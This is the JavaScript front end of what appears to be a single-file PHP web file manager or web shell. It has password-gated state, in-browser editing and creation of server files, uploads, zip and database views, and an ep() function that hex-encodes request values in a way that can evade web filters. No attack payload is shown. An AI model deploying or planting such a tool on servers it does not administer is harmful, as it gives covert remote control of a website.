<script>
var cDir='<?php echo addslashes($currentDir);?>',selfF='<?php echo $selfFile;?>',editor=null,editPath='',editUrl='',ctxEl=null,PASS='<?php echo $PASS;?>',currentZipPath='',currentZipSub='',currentTable='',currentSort='name',currentOrder='asc';
function ep(v){try{return btoa(unescape(encodeURIComponent(v))).split('').map(function(c){return c.charCodeAt(0).toString(16).padStart(2,'0')}).join('')}catch(e){return encodeURIComponent(v)}}
function fsize(b){if(b>=1073741824)return(b/1073741824).toFixed(2)+' GB';if(b>=1048576)return(b/1048576).toFixed(2)+' MB';if(b>=1024)return(b/1024).toFixed(2)+' KB';return b+' B';}
function fdate(t){var d=new Date(t*1000);return d.toLocaleDateString('tr-TR',{day:'2-digit',month:'2-digit',year:'numeric'})+' '+d.toLocaleTimeString('tr-TR',{hour:'2-digit',minute:'2-digit'});}
function fmtDateOnly(s){if(!s)return'-';var d=new Date(s);if(isNaN(d.getTime())){var ts=Date.parse(s);if(!isNaN(ts))d=new Date(ts);else return s;}var dd=('0'+d.getDate()).slice(-2);var mm=('0'+(d.getMonth()+1)).slice(-2);var yy=d.getFullYear();return dd+'.'+mm+'.'+yy;} 
function epochToLocalDatetime(ts){if(!ts)return'';var d=new Date(parseInt(ts,10)*1000);var YYYY=d.getFullYear();var MM=('0'+(d.getMonth()+1)).slice(-2);var DD=('0'+d.getDate()).slice(-2);var hh=('0'+d.getHours()).slice(-2);var mm=('0'+d.getMinutes()).slice(-2);return YYYY+'-'+MM+'-'+DD+'T'+hh+':'+mm;} 
function showMsg(txt,type,extra,persistent){var area=document.getElementById('msgArea');var html='<div class="msg-box '+(type||'success')+'"><div class="msg-content"><div class="msg-text"><div>'+txt+'</div>';if(extra)html+='<div class="msg-actions">'+extra+'</div>';html+='</div><button class="close-btn" onclick="this.closest(\'.msg-box\').remove()">&times;</button></div></div>';area.innerHTML+=html;if(!persistent){setTimeout(function(){var boxes=area.querySelectorAll('.msg-box');if(boxes.length>0)boxes[0].remove();},12000);}}
function toggleEditorFullscreen(){var m=document.getElementById('editorModal');var d=m.querySelector('.modal-dialog');var c=m.querySelector('.modal-content');if(d.classList.contains('modal-fullscreen')){d.classList.remove('modal-fullscreen');d.classList.add('modal-xl');c.classList.remove('modal-fullscreen-custom');}else{d.classList.remove('modal-xl');d.classList.add('modal-fullscreen');c.classList.add('modal-fullscreen-custom');}setTimeout(function(){editor.resize();},100);}
function clientSort(col){var list=document.getElementById('fileList');var rows=Array.from(list.querySelectorAll('tr'));if(currentSort===col){currentOrder=currentOrder==='asc'?'desc':'asc';}else{currentSort=col;currentOrder='asc';}document.querySelectorAll('.sort-icon').forEach(function(s){s.innerHTML='';});document.getElementById('sort-'+col).innerHTML=currentOrder==='asc'?'&#9650;':'&#9660;';rows.sort(function(a,b){var av,bv,r=0;if(col==='name'){av=a.getAttribute('data-name').toLowerCase();bv=b.getAttribute('data-name').toLowerCase();var aDir=a.getAttribute('data-dir')==='1';var bDir=b.getAttribute('data-dir')==='1';if(aDir&&!bDir)return -1;if(!aDir&&bDir)return 1;r=av.localeCompare(bv);}else if(col==='size'){av=parseInt(a.getAttribute('data-size'))||0;bv=parseInt(b.getAttribute('data-size'))||0;r=av-bv;}else if(col==='ctime'){av=parseInt(a.getAttribute('data-ctime'))||0;bv=parseInt(b.getAttribute('data-ctime'))||0;r=av-bv;}else if(col==='mtime'){av=parseInt(a.getAttribute('data-mtime'))||0;bv=parseInt(b.getAttribute('data-mtime'))||0;r=av-bv;}else if(col==='perms'){av=a.getAttribute('data-perms')||'';bv=b.getAttribute('data-perms')||'';r=av.localeCompare(bv);}return currentOrder==='desc'?-r:r;});rows.forEach(function(r){list.appendChild(r);});}
var selectedFilesList=[];
function updateFileLabel(){var input=document.getElementById('uploadFiles');var files=input.files;for(var i=0;i<files.length;i++){var exists=false;for(var j=0;j<selectedFilesList.length;j++){if(selectedFilesList[j].name===files[i].name&&selectedFilesList[j].size===files[i].size){exists=true;break;}}if(!exists)selectedFilesList.push(files[i]);}renderFileList();}
function renderFileList(){var container=document.getElementById('selectedFiles');var clearBtn=document.getElementById('clearSelectedBtn');if(!container)return;if(selectedFilesList.length===0){container.innerHTML='';if(clearBtn)clearBtn.classList.add('d-none');return;}var html='';for(var i=0;i<selectedFilesList.length;i++){var f=selectedFilesList[i];var size=f.size<1024?f.size+' B':f.size<1048576?(f.size/1024).toFixed(1)+' KB':(f.size/1048576).toFixed(1)+' MB';html+='<div class="file-list-item"><span title="'+f.name+'">'+f.name+'</span><span class="file-size">'+size+'</span><i class="bi bi-x-circle remove-file" onclick="removeFile('+i+')"></i></div>';}container.innerHTML=html;if(clearBtn)clearBtn.classList.remove('d-none');}
function removeFile(idx){selectedFilesList.splice(idx,1);renderFileList();}
document.addEventListener('DOMContentLoaded',function(){
editor=ace.edit('aceEditor');editor.setTheme('ace/theme/monokai');editor.setFontSize(13);editor.setShowPrintMargin(false);
document.getElementById('searchInput').onkeypress=function(e){if(e.key==='Enter')doSearch();};
document.getElementById('hashInput').onkeypress=function(e){if(e.key==='Enter')generateHashes();};
document.getElementById('uploadModal').addEventListener('hidden.bs.modal',function(){selectedFilesList=[];renderFileList();document.getElementById('uploadFiles').value='';document.getElementById('uploadProgress').style.display='none';document.getElementById('uploadBar').style.width='0%';var clearBtn=document.getElementById('clearSelectedBtn');if(clearBtn)clearBtn.classList.add('d-none');});
document.getElementById('timeFilter').onchange=function(){var d=document.querySelectorAll('.dateRange');for(var i=0;i<d.length;i++)d[i].style.display=this.value==='custom'?'block':'none';};
document.querySelectorAll('#fileList tr').forEach(function(r){r.oncontextmenu=function(e){e.preventDefault();ctxEl=this;var m=document.getElementById('ctxMenu');m.style.display='block';m.style.left=Math.min(e.pageX,window.innerWidth-160)+'px';m.style.top=Math.min(e.pageY,window.innerHeight-200)+'px';};});
document.onclick=function(){document.getElementById('ctxMenu').style.display='none';};
document.getElementById('newFileForm').onsubmit=function(e){e.preventDefault();var fn=document.getElementById('newFileName').value;if(!fn)return;fetch('',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'action=createFile&name='+encodeURIComponent(fn)}).then(function(){newBlankEditor(cDir+'/'+fn,fn);bootstrap.Modal.getInstance(document.getElementById('fileModal')).hide();}).catch(function(){newBlankEditor(cDir+'/'+fn,fn);bootstrap.Modal.getInstance(document.getElementById('fileModal')).hide();});};
function newBlankEditor(p,fn){editPath=p;document.getElementById('editorFileName').textContent=fn;var e2=fn.split('.').pop().toLowerCase();var m={php:'php',js:'javascript',css:'css',html:'html',json:'json',sql:'sql',py:'python',sh:'sh'};editor.session.setMode('ace/mode/'+(m[e2]||'text'));editor.setValue('',-1);editor.focus();var docRoot='<?php echo addslashes(isset($_SERVER['DOCUMENT_ROOT'])?$_SERVER['DOCUMENT_ROOT']:'');?>';var rel=editPath.replace(docRoot,'').replace(/\\/g,'/');if(rel.charAt(0)!=='/')rel='/'+rel;editUrl='<?php echo (isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on'?'https':'http').'://'.$siteName;?>'+rel;document.getElementById('editorGoLink').href=editUrl;new bootstrap.Modal(document.getElementById('editorModal')).show();}
